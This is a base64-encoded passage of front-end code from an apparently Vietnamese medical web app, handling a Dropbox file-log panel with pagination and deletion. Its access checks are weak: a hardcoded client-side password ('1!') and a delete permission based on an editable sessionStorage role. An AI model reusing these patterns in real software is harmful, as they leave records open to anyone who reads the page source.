zPSJmYS1zb2xpZCBmYS10cmlhbmdsZS1leGNsYW1hdGlvbiIgc3R5bGU9ImNvbG9yOnllbGxvdyI+PC9pPiA8c3BhbiBzdHlsZT0iY29sb3I6eWVsbG93OyBmb250LXdlaWdodDpib2xkIj4oJHtvdXRsaWVyQ291bnR9KTwvc3Bhbj5gOw0KDQoNCn0NCjwvc2NyaXB0Pg0KPGRpdiBpZD0iZHJvcGJveFBhbmVsIiBzdHlsZT0iZGlzcGxheTpub25lOyBwb3NpdGlvbjpmaXhlZDsgaW5zZXQ6MDsgYmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7IHotaW5kZXg6OTk5OTsiPg0KICA8ZGl2IGNsYXNzPSJzYWN0aHVvY3RoYW5nIj4NCiAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6IGZsZXg7IGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsgYWxpZ24taXRlbXM6IGNlbnRlcjsiPg0KICA8aDM+8J+TgiBEYW5oIHPDoWNoIEtob2EgxJHDoyBz4butIGThu6VuZyBwaOG6p24gbeG7gW08L2gzPg0KICA8YnV0dG9uIGNsYXNzPSJidG4ib25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYW5lbCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnInN0eWxlPSJwYWRkaW5nOjhweCAxNHB4OyBmb250LXNpemU6MTNweDsgYm9yZGVyLXJhZGl1czo0cHg7Ij4NCiAgICDEkMOzbmcNCiAgPC9idXR0b24+DQo8L2Rpdj4NCjwhLS0gUGFnaW5hdGlvbiBjb250cm9scyAtLT4NCjxkaXYgaWQ9ImRyb3Bib3hQYWdlciIgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOjhweDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjttYXJnaW4tdG9wOjEycHgiPg0KICA8ZGl2Pg0KICAgIEhp4buDbiB0aOG7iw0KICAgIDxzZWxlY3QgaWQ9ImRyb3Bib3hQYWdlU2l6ZSIgc3R5bGU9InBhZGRpbmc6NnB4IDhweDtib3JkZXI6MXB4IHNvbGlkICNkZGQ7Ym9yZGVyLXJhZGl1czo2cHgiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iMTAiIHNlbGVjdGVkPjEwPC9vcHRpb24+DQogICAgICA8b3B0aW9uIHZhbHVlPSIyMCI+MjA8L29wdGlvbj4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjUwIj41MDwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICAgIGTDsm5nIC8gdHJhbmcNCiAgPC9kaXY+DQoNCiAgPGRpdiBpZD0iZHJvcGJveFBhZ2VCdXR0b25zIiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDo2cHg7ZmxleC13cmFwOndyYXAiPjwvZGl2Pg0KDQogIDxkaXYgaWQ9ImRyb3Bib3hQYWdlSW5mbyIgc3R5bGU9Im1pbi13aWR0aDoxNzBweDt0ZXh0LWFsaWduOnJpZ2h0Ij48L2Rpdj4NCjwvZGl2Pg0KICAgIDx0YWJsZSBib3JkZXI9IjEiIGNlbGxwYWRkaW5nPSI4IiBzdHlsZT0id2lkdGg6MTAwJTsgYm9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlOyBmb250LXNpemU6MTRweCI+DQogICAgICA8dGhlYWQ+DQogICAgICAgIDx0cj4NCiAgICAgICAgICA8dGg+U1RUPC90aD4NCiAgICAgICAgICA8dGg+VMOqbiBraG9hPC90aD4NCiAgICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICAgIDx0aD5T4bqvYyB0aHXhu5FjPC90aD4NCiAgICAgICAgIDx0aD5TYWkgdGjhu51pIGdpYW48L3RoPg0KICAgICAgIDx0aD5UcsO5bmcgZ2nhu508L3RoPg0KICAgICAgIA0KICAgICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQoJCSAgPHRoPkxpbms8L3RoPg0KCQkgIDx0aD5Yb8OhPC90aD4NCiAgICAgICAgPC90cj4NCiAgICAgIDwvdGhlYWQ+DQogICAgICA8dGJvZHkgaWQ9ImRyb3Bib3hGaWxlTGlzdCI+PC90Ym9keT4NCiAgICA8L3RhYmxlPg0KICANCiAgPC9kaXY+DQo8L2Rpdj48c2NyaXB0Pg0KYXN5bmMgZnVuY3Rpb24gc2hvd0Ryb3Bib3hQYW5lbCgpIHsNCmF3YWl0IGVuc3VyZURyb3Bib3goKTsgLy8gxJHhuqNtIGLhuqNvIGPDsyBEcm9wYm94IFNESw0KDQogIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94RmlsZUxpc3QnKTsNCg0KICAvLyBIaeG7h24gcG9wdXAgbmdheSBs4bqtcCB04bupYyB24bubaSB0cuG6oW5nIHRow6FpIGxvYWRpbmcNCiAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iOSIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpibHVlOyI+DQogICAgxJBhbmcgdOG6o2kgZOG7ryBsaeG7h3UuLi4NCiAgPC90ZD48L3RyPmA7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFuZWwnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCg0KICB0cnkgew0KICAgIC8vIDEpIEtp4buDbSB0cmEgdOG7k24gdOG6oWkgbG9nLmpzb24NCiAgICBsZXQgaGFzTG9nID0gZmFsc2U7DQogICAgbGV0IHJlcyA9IGF3YWl0IGRieC5maWxlc0xpc3RGb2xkZXIoeyBwYXRoOiAnL3RodXRodWF0JyB9KTsNCiAgICB3aGlsZSAodHJ1ZSkgew0KICAgICAgaWYgKHJlcy5yZXN1bHQ/LmVudHJpZXM/LnNvbWUoZSA9PiBlWycudGFnJ10gPT09ICdmaWxlJyAmJiBlLm5hbWUgPT09ICdsb2cuanNvbicpKSB7DQogICAgICAgIGhhc0xvZyA9IHRydWU7DQogICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgICAgaWYgKCFyZXMucmVzdWx0Py5oYXNfbW9yZSkgYnJlYWs7DQogICAgICByZXMgPSBhd2FpdCBkYnguZmlsZXNMaXN0Rm9sZGVyQ29udGludWUoeyBjdXJzb3I6IHJlcy5yZXN1bHQuY3Vyc29yIH0pOw0KICAgIH0NCg0KICAgIC8vIDIpIE7hur91IGtow7RuZyBjw7MgZmlsZSDihpIgY+G6rXAgbmjhuq10IG7hu5lpIGR1bmcNCiAgICBpZiAoIWhhc0xvZykgew0KICAgICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgICAgS2jDtG5nIGPDsyBkYW5oIHPDoWNoIG7DoG8gxJHGsOG7o2MgbMawdQ0KICAgICAgPC90ZD48L3RyPmA7DQogICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gMykgQ8OzIGZpbGUg4oaSIHThuqNpIHbDoCBoaeG7g24gdGjhu4sNCiAgICBjb25zdCBkbCA9IGF3YWl0IGRieC5maWxlc0Rvd25sb2FkKHsgcGF0aDogJy90aHV0aHVhdC9sb2cuanNvbicgfSk7DQogICAgY29uc3QgdGV4dCA9IGF3YWl0IGRsLnJlc3VsdC5maWxlQmxvYi50ZXh0KCk7DQogICAgbGV0IGxvZ3MgPSBbXTsNCiAgICB0cnkgeyBsb2dzID0gSlNPTi5wYXJzZSh0ZXh0KTsgfSBjYXRjaCB7IGxvZ3MgPSBbXTsgfQ0KDQogICAgaWYgKCFsb2dzLmxlbmd0aCkgew0KICAgICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgICAgS2jDtG5nIGPDsyBkYW5oIHPDoWNoIG7DoG8gxJHGsOG7o2MgbMawdQ0KICAgICAgPC90ZD48L3RyPmA7DQogICAgfSBlbHNlIHsNCiBjb25zdCBjdXJyZW50VXNlciA9IChzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykgfHwgJycpLnRvTG93ZXJDYXNlKCk7DQoNCi8vIFJlbmRlciBt4bubaSDigJMgZ2lhbyBjaG8gYuG7mSBwaMOibiB0cmFuZzoNCkRCX0xPR1MgPSBsb2dzOyAvLyBt4bqjbmcgZOG7ryBsaeG7h3UgxJHhuqd5IMSR4bunDQpEQl9QQUdFID0gMTsgICAgLy8gduG7gSB0cmFuZyAxIG3hu5dpIGtoaSBt4bufIHBhbmVsDQpEQl9DVVJSRU5UX1VTRVIgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KDQphdHRhY2hQYWdlckV2ZW50c09uY2UoKTsgLy8gZ+G6r24gY2hhbmdlIGNobyBzZWxlY3QgcGFnZSBzaXplIChjaOG7iSAxIGzhuqduKQ0KcmVuZGVyRHJvcGJveFBhZ2UoKTsgICAgIC8vIHbhur0gdGJvZHkgKyBuw7p0IHRyYW5nIHThu6sgREJfTE9HUw0KICAgIH0NCiAgfSBjYXRjaCAoZXJyKSB7DQogICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSR4buNYyBkYW5oIHPDoWNoIHThu6sgRHJvcGJveDonLCBlcnIpOw0KICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICBLaMO0bmcgdGjhu4MgdOG6o2kgZOG7ryBsaeG7h3UNCiAgICA8L3RkPjwvdHI+YDsNCiAgfQ0KfQ0KKGZ1bmN0aW9uKCl7DQogIGNvbnN0IHBhZ2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlcicpOw0KICBpZiAocGFnZXIgJiYgIXBhZ2VyLmRhdGFzZXQuYm91bmQpIHsNCiAgICBwYWdlci5kYXRhc2V0LmJvdW5kID0gJzEnOw0KICAgIHBhZ2VyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgICBwYWdlci5hZGRFdmVudExpc3RlbmVyKCdtb3VzZWRvd24nLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICB9DQp9KSgpOw0KDQo8L3NjcmlwdD4NCg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHZlcmlmeUFuZE9wZW5MaW5rKHVybCkgew0KDQoNCiAgLy8gT3ZlcmxheSB04buRaSAoY2xpY2sgdsOgbyBz4bq9IHThuq90KQ0KICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24ob3ZlcmxheS5zdHlsZSwgew0KICAgIHBvc2l0aW9uOiAnZml4ZWQnLCBpbnNldDogJzAnLCBiYWNrZ3JvdW5kOiAncmdiYSgwLDAsMCwwLjUpJywNCiAgICBkaXNwbGF5OiAnZmxleCcsIGp1c3RpZnlDb250ZW50OiAnY2VudGVyJywgYWxpZ25JdGVtczogJ2NlbnRlcicsDQogICAgekluZGV4OiAnMTAwMDAnDQogIH0pOw0KDQogIC8vIEtodW5nIHBvcHVwDQogIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBib3guY2xhc3NOYW1lID0gJ3BvcHVwLXhvYSc7DQoNCiAgLy8gVGnDqnUgxJHhu4Egbmfhuq9uIGfhu41uIChraMO0bmcgY8OzIGljb24vZ+G7rWkgZOG7ryBsaeG7h3UpDQogIGNvbnN0IHRpdGxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIHRpdGxlLnRleHRDb250ZW50ID0gJ05o4bqtcCBt4bqtdCBraOG6qXUgxJHhu4MgbeG7nyBsaW5rJzsNCiAgdGl0bGUuc3R5bGUuZm9udFdlaWdodCA9ICc2MDAnOw0KDQogIC8vIMOUIG5o4bqtcCBt4bqtdCBraOG6qXUNCiAgY29uc3QgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOw0KICBPYmplY3QuYXNzaWduKGlucHV0LCB7IHR5cGU6ICdwYXNzd29yZCcsIHBsYWNlaG9sZGVyOiAnTeG6rXQga2jhuql1JyB9KTsNCmlucHV0LmNsYXNzTmFtZSA9ICdwb3B1cC1pbnB1dCc7DQoNCiAgLy8gVGjDtG5nIGLDoW8gbOG7l2kgKOG6qW4gbeG6t2MgxJHhu4tuaCkNCiAgY29uc3QgZXJyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGVyci50ZXh0Q29udGVudCA9ICfinYwgU2FpIG3huq10IGto4bqpdSEnOw0KICBPYmplY3QuYXNzaWduKGVyci5zdHlsZSwgeyBjb2xvcjogJ3JlZCcsIGZvbnRTaXplOiAnMTRweCcsIGRpc3BsYXk6ICdub25lJyB9KTsNCg0KICAvLyBOw7p0IHjDoWMgbmjhuq1uDQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2J1dHRvbicpOw0KICBidG4udGV4dENvbnRlbnQgPSAnWMOhYyBuaOG6rW4nOw0KICBPYmplY3QuYXNzaWduKGJ0bi5zdHlsZSwgew0KICAgIHBhZGRpbmc6ICcxMHB4IDE2cHgnLCBiYWNrZ3JvdW5kOiAnIzM0OThkYicsIGNvbG9yOiAnI2ZmZicsDQogICAgYm9yZGVyOiAnbm9uZScsIGJvcmRlclJhZGl1czogJzZweCcsIGN1cnNvcjogJ3BvaW50ZXInDQogIH0pOw0KDQogIC8vIFByb2dyZXNzIGJhciAoxJHhurd0IETGr+G7mkkgQ8OZTkcpDQogIGNvbnN0IGJhcldyYXAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihiYXJXcmFwLnN0eWxlLCB7DQogICAgd2lkdGg6ICcxMDAlJywgYmFja2dyb3VuZDogJyNkZGQnLCBoZWlnaHQ6ICc2cHgnLA0KICAgIGJvcmRlclJhZGl1czogJzNweCcsIG1hcmdpblRvcDogJzEycHgnDQogIH0pOw0KICBjb25zdCBiYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihiYXIuc3R5bGUsIHsgd2lkdGg6ICcwJScsIGhlaWdodDogJzEwMCUnLCBiYWNrZ3JvdW5kOiAnIzM0OThkYicgfSk7DQogIGJhcldyYXAuYXBwZW5kQ2hpbGQoYmFyKTsNCg0KICAvLyBH4bqvbiB2w6BvIERPTQ0KICBib3guYXBwZW5kQ2hpbGQodGl0bGUpOw0KICBib3guYXBwZW5kQ2hpbGQoaW5wdXQpOw0KICBib3guYXBwZW5kQ2hpbGQoZXJyKTsNCiAgYm94LmFwcGVuZENoaWxkKGJ0bik7DQogIGJveC5hcHBlbmRDaGlsZChiYXJXcmFwKTsNCiAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG92ZXJsYXkpOw0KDQogIC8vIENo4bq3biBjbGljayBiw6puIHRyb25nIGtow7RuZyDEkcOzbmcNCiAgYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgLy8gQ2xpY2sgcmEgbmdvw6BpIMSR4buDIHThuq90DQogIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgfSk7DQoNCiAgLy8gWOG7rSBsw70geMOhYyBuaOG6rW4NCiAgYXN5bmMgZnVuY3Rpb24gc3VibWl0KCkgew0KICAgIC8vIMSQ4buVaSBt4bqtdCBraOG6qXUg4bufIMSRw6J5DQogICAgY29uc3QgT0sgPSBpbnB1dC52YWx1ZSA9PT0gJzEhJzsNCg0KICAgIGlmICghT0spIHsNCiAgICAgIGVyci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIHJldHVybjsNCiAgICB9DQogICAgZXJyLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgYnRuLmRpc2FibGVkID0gdHJ1ZTsNCiAgICBpbnB1dC5kaXNhYmxlZCA9IHRydWU7DQoNCiAgICAvLyBBbmltYXRlIHByb2dyZXNzIG5oYW5oIGzDqm4gMTAwJQ0KICAgIGJhci5zdHlsZS50cmFuc2l0aW9uID0gJ3dpZHRoIDAuNnMgZWFzZSc7DQogICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IChiYXIuc3R5bGUud2lkdGggPSAnMTAwJScpKTsNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgIHdpbmRvdy5vcGVuKHVybCwgJ19ibGFuaycpOw0KICAgICAgaWYgKG92ZXJsYXkucGFyZW50Tm9kZSkgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgICB9LCA2NTApOw0KICB9DQoNCiAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgc3VibWl0KTsNCiAgaW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIChlKSA9PiB7DQogICAgaWYgKGUua2V5ID09PSAnRW50ZXInKSBzdWJtaXQoKTsNCiAgfSk7DQoNCiAgLy8gRm9jdXMgbmdheSDDtCBt4bqtdCBraOG6qXUNCiAgc2V0VGltZW91dCgoKSA9PiBpbnB1dC5mb2N1cygpLCAwKTsNCn0NCg0KZnVuY3Rpb24gZXh0cmFjdEZpbGVuYW1lKGRyb3Bib3hQcmV2aWV3VXJsKSB7DQogIHRyeSB7DQogICAgY29uc3QgdSA9IG5ldyBVUkwoZHJvcGJveFByZXZpZXdVcmwpOw0KICAgIGNvbnN0IHAgPSB1LnNlYXJjaFBhcmFtcy5nZXQoJ3ByZXZpZXcnKTsNCiAgICByZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KHAgfHwgJycpOw0KICB9IGNhdGNoIHsgcmV0dXJuICcnOyB9DQp9DQoNCi8vIEjhu5lwIHjDoWMgbmjhuq1uIHhvw6EgKHRy4bqjIHbhu4EgUHJvbWlzZTxib29sZWFuPikNCmZ1bmN0aW9uIGNvbmZpcm1EZWxldGVQb3B1cCh0ZXh0PSdC4bqhbiBjw7MgY2jhuq9jIG114buRbiB4b8OhPycsIG9uZUJ1dHRvbj1mYWxzZSkgew0KICByZXR1cm4gbmV3IFByb21pc2UocmVzb2x2ZSA9PiB7DQogICAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgIE9iamVjdC5hc3NpZ24ob3ZlcmxheS5zdHlsZSwgew0KICAgICAgcG9zaXRpb246J2ZpeGVkJywgaW5zZXQ6JzAnLCBiYWNrZ3JvdW5kOidyZ2JhKDAsMCwwLDAuNSknLA0KICAgICAgZGlzcGxheTonZmxleCcsIGFsaWduSXRlbXM6J2NlbnRlcicsIGp1c3RpZnlDb250ZW50OidjZW50ZXInLCB6SW5kZXg6MTAwMDENCiAgICB9KTsNCg0KICAgIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICBib3guY2xhc3NOYW1lID0gJ3BvcHVwLXhvYSc7DQogICAgYm94LmlubmVySFRNTCA9IGANCiAgICAgIDxkaXYgc3R5bGU9ImZvbnQtd2VpZ2h0OjYwMDsgbWFyZ2luLWJvdHRvbTo4cHgiPljDoWMgbmjhuq1uIHhvw6E8L2Rpdj4NCiAgICAgIDxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206MTRweCI+JHt0ZXh0fTwvZGl2Pg0KICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4OyBnYXA6MTBweDsganVzdGlmeS1jb250ZW50OmZsZXgtZW5kIj4NCiAgICAgICAgPGJ1dHRvbiBpZD0iZGxnQ2FuY2VsIiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDojN2Y4YzhkIj5IdeG7tzwvYnV0dG9uPg0KICAgICAgICAkeyFvbmVCdXR0b24gPyBgPGJ1dHRvbiBpZD0iZGxnWWVzIiBjbGFzcz0iYnRuIiBzdHlsZT0iYmFja2dyb3VuZDojZTc0YzNjIj5Yb8OhPC9idXR0b24+YCA6ICcnfQ0KICAgICAgPC9kaXY+DQogICAgYDsNCg0KICAgIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG92ZXJsYXkpOw0KDQogICAgYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKGZhbHNlKTsgfSk7DQogICAgYm94LnF1ZXJ5U2VsZWN0b3IoJyNkbGdDYW5jZWwnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZShmYWxzZSk7IH0pOw0KDQogICAgaWYgKCFvbmVCdXR0b24pIHsNCiAgICAgIGJveC5xdWVyeVNlbGVjdG9yKCcjZGxnWWVzJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUodHJ1ZSk7IH0pOw0KICAgIH0NCiAgfSk7DQp9DQoNCi8vIFhvw6EgMSBlbnRyeSBsb2cgKyBmaWxlIEV4Y2VsIHRyw6puIERyb3Bib3ggKHRoZW8gaW5kZXggdHJvbmcgbeG6o25nIGxvZ3MpDQphc3luYyBmdW5jdGlvbiBkZWxldGVMb2dBbmRGaWxlX0J5SW5kZXgoaWR4KSB7DQogIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KICBjb25zdCBsb2dQYXRoID0gJy90aHV0aHVhdC9sb2cuanNvbic7DQoNCiAgLy8gMSkgVOG6o2kgbG9nLmpzb24gaGnhu4duIHThuqFpDQogIGxldCBsb2dzID0gW107DQogIHRyeSB7DQogICAgY29uc3QgZGwgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6IGxvZ1BhdGggfSk7DQogICAgY29uc3QgdGV4dCA9IGF3YWl0IGRsLnJlc3VsdC5maWxlQmxvYi50ZXh0KCk7DQogICAgbG9ncyA9IEpTT04ucGFyc2UodGV4dCB8fCAnW10nKTsNCiAgfSBjYXRjaCAoZSkgew0KICAgIGFsZXJ0KCdLaMO0bmcgxJHhu41jIMSRxrDhu6NjIGxvZy5qc29uIHRyw6puIERyb3Bib3guJyk7IA0KICAgIHRocm93IGU7DQogIH0NCg0KICBjb25zdCBpdGVtID0gbG9nc1tpZHhdOw0KICBpZiAoIWl0ZW0pIHsgYWxlcnQoJ0tow7RuZyB0w6xtIHRo4bqleSBt4bulYyBj4bqnbiB4b8OhLicpOyByZXR1cm47IH0NCg0KICAvLyAyKSBM4bqleSBmaWxlTmFtZSAmIHhvw6EgZmlsZSBFeGNlbCAobuG6v3UgY8OzKQ0KICBjb25zdCBmaWxlTmFtZSA9IGV4dHJhY3RGaWxlbmFtZShpdGVtLmxpbmsgfHwgJycpOw0KICBjb25zdCBmaWxlUGF0aCA9IGZpbGVOYW1lID8gYC90aHV0aHVhdC8ke2ZpbGVOYW1lfWAgOiBudWxsOw0KDQogIHRyeSB7DQogICAgaWYgKGZpbGVQYXRoKSB7IGF3YWl0IGRieC5maWxlc0RlbGV0ZVYyKHsgcGF0aDogZmlsZVBhdGggfSk7IH0NCiAgfSBjYXRjaCAoZSkgew0KICAgIC8vIE7hur91IGZpbGUga2jDtG5nIHThu5NuIHThuqFpIHbhuqtuIHRp4bq/cCB04bulYyB4b8OhIGxvZw0KICAgIGNvbnNvbGUud2FybignWG/DoSBmaWxlIEV4Y2VsIGzhu5dpL2tow7RuZyB04buTbiB04bqhaSwgdGnhur9wIHThu6VjIHhvw6EgbG9nLi4uJywgZSk7DQogIH0NCg0KICAvLyAzKSBD4bqtcCBuaOG6rXQgbG9nOiBi4buPIHBo4bqnbiB04butIGlkeCB2w6AgZ2hpIMSRw6ggbOG6oWkNCiAgbG9ncy5zcGxpY2UoaWR4LCAxKTsNCiAgYXdhaXQgZGJ4LmZpbGVzVXBsb2FkKHsNCiAgICBwYXRoOiBsb2dQYXRoLA0KICAgIGNvbnRlbnRzOiBKU09OLnN0cmluZ2lmeShsb2dzLCBudWxsLCAyKSwNCiAgICBtb2RlOiB7ICcudGFnJzogJ292ZXJ3cml0ZScgfSwNCiAgICBhdXRvcmVuYW1lOiBmYWxzZQ0KICB9KTsNCn0NCg0KDQphc3luYyBmdW5jdGlvbiBvbkRlbGV0ZUxvZ1JvdyhpbmRleEluTG9ncywgY3VycmVudFVzZXIpIHsNCiAgLy8gTuG6v3Uga2jDtG5nIHBo4bqjaSBkb2N0b3Ig4oaSIHBvcHVwIGPhuqVtIHhvw6EsIGNo4buJIGPDsyAxIG7DunQgSHXhu7cNCiAgaWYgKGN1cnJlbnRVc2VyICE9PSAnZG9jdG9yJykgew0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgNCiAgICAgICfinYwgw4ogbMOgbSBjw6FpIGfDrCDEkeG6pXl5eXkgZW0gxqFpLiA8YnIvPkThu6tuZyBs4bqhaSBuZ2F5LCBxdcOhIG5ndXkgaGnhu4NtLicsDQogICAgICB0cnVlIC8vIDwtLSBjaOG6vyDEkeG7mSAxIG7DunQNCiAgICApOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIC8vIE7hur91IGzDoCBkb2N0b3Ig4oaSIHBvcHVwIHjDoWMgbmjhuq1uIHhvw6EgKDIgbsO6dCkNCiAgY29uc3Qgb2sgPSBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoDQogICAgJ0LhuqFuIGPDsyBjaOG6r2MgbXXhu5FuIHhvw6EgbeG7pWMgbsOgeT8nLA0KICAgIGZhbHNlDQogICk7DQogIGlmICghb2spIHJldHVybjsNCg0KICB0cnkgew0KICAgIGF3YWl0IGRlbGV0ZUxvZ0FuZEZpbGVfQnlJbmRleChpbmRleEluTG9ncyk7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKCfinIUgxJDDoyB4b8OhIHRow6BuaCBjw7RuZyEnLCB0cnVlKTsNCiAgICBhd2FpdCBzaG93RHJvcGJveFBhbmVsKCk7DQogIH0gY2F0Y2ggKGUpIHsNCiAgICBjb25zb2xlLmVycm9yKGUpOw0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgn4pqg77iPIEPDsyBs4buXaSBraGkgeG/DoS4gVnVpIGzDsm5nIHRo4butIGzhuqFpLicsIHRydWUpOw0KICB9DQp9DQoNCi8vIMSQw7NuZyBwYW5lbCBraGkgYuG6pW0gRVNDIGhv4bq3YyBjbGljayByYSBuZ2/DoGkNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihlKSB7DQogIGlmIChlLmtleSA9PT0gIkVzY2FwZSIpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHJvcGJveFBhbmVsIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgfQ0KfSk7DQoNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZSkgew0KICBjb25zdCBwYW5lbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkcm9wYm94UGFuZWwiKTsNCiAgaWYgKHBhbmVsLnN0eWxlLmRpc3BsYXkgPT09ICJibG9jayIgfHwgcGFuZWwuc3R5bGUuZGlzcGxheSA9PT0gImZsZXgiKSB7DQogICAgY29uc3QgY29udGVudCA9IHBhbmVsLnF1ZXJ5U2VsZWN0b3IoImRpdiIpOw0KICAgIC8vIE7hur91IGNsaWNrIG5nb8OgaSB2w7luZyBu4buZaSBkdW5nIHBhbmVsDQogICAgaWYgKCFjb250ZW50LmNvbnRhaW5zKGUudGFyZ2V0KSkgew0KICAg